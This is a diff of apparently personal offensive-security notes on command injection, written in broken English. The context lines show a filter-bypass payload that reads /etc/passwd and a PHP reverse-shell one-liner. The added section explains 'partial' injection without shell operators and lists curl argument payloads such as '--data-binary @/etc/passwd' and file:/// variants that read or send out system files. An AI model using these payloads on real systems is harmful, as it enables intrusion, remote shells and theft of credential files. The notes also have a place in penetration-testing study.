@@ -55,3 +55,17 @@ cat $(HOME:0:1)etc$(HOME:0:1)passwd
         - php -r '$sock=fsockopen("IP",PORT);exec("sh <&3 >&3 2>&3");'
 # Tool
 - like [[sqlmap]]
+
+
+
+### Command injection Partial
+we in this type Ci can't be using operators(& | ; ..)
+should be using (command future)
+example when background command is `curl` should use 
+```shell
+SINPUT --data-binary @/etc/passwd
+file:///etc/passwd
+file\:/etc/passwd
+{file}:/etc/passwd
+```
+
